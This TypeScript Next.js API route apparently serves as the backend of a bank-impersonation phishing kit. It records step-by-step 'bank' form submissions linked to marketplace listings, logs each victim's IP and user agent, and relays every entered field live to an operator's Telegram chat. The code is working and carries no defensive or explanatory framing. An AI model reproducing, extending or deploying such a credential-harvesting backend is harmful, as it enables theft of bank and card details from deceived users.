import { NextRequest } from "next/server";
import { prisma } from "@/lib/prisma";
import { corsResponse, corsOptions } from "@/lib/cors";
import { sendTelegramNotification } from "@/lib/telegram";

export async function OPTIONS() {
  return corsOptions();
}

export async function POST(req: NextRequest) {
  const body = await req.json().catch(() => null);
  if (!body || typeof body !== "object") {
    return corsResponse({ error: "Invalid body" }, 400);
  }

  const { bankSlug, listingSlug, step, data, sessionId } = body as {
    bankSlug?: string;
    listingSlug?: string;
    step?: string;
    data?: Record<string, unknown>;
    sessionId?: string;
  };

  if (!bankSlug || !step || !data || typeof data !== "object") {
    return corsResponse({ error: "bankSlug, step, data required" }, 400);
  }

  const bank = await prisma.bank.findUnique({ where: { slug: bankSlug } });
  if (!bank) return corsResponse({ error: "Bank not found" }, 404);

  const listing = listingSlug
    ? await prisma.listing.findFirst({ where: { slug: listingSlug } })
    : null;

  const ip =
    req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
    req.headers.get("x-real-ip") ||
    "";
  const userAgent = req.headers.get("user-agent") || "";

  const submission = await prisma.bankSubmission.create({
    data: {
      bankId: bank.id,
      listingId: listing?.id ?? null,
      sessionId: sessionId ?? null,
      step,
      data: data as object,
      ip,
      userAgent,
    },
  });

  if (sessionId) {
    await prisma.bankSession.updateMany({
      where: { id: sessionId },
      data: { currentStep: step, lastSeenAt: new Date() },
    });
  }

  const settings = await prisma.settings.findFirst();
  if (settings?.telegramBotToken && settings?.telegramChatId) {
    const dataLines = Object.entries(data)
      .map(([k, v]) => `<b>${escapeHtml(k)}:</b> <code>${escapeHtml(String(v))}</code>`)
      .join("\n");

    const message = [
      `🏦 <b>${escapeHtml(bank.name)}</b> — <i>${escapeHtml(step)}</i>`,
      listing ? `📦 ${escapeHtml(listing.title)} (${escapeHtml(listing.slug)})` : null,
      ip ? `🌐 IP: <code>${escapeHtml(ip)}</code>` : null,
      "",
      dataLines,
    ]
      .filter(Boolean)
      .join("\n");

    sendTelegramNotification(settings.telegramBotToken, settings.telegramChatId, message);
  }

  return corsResponse({ id: submission.id, ok: true });
}

function escapeHtml(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}
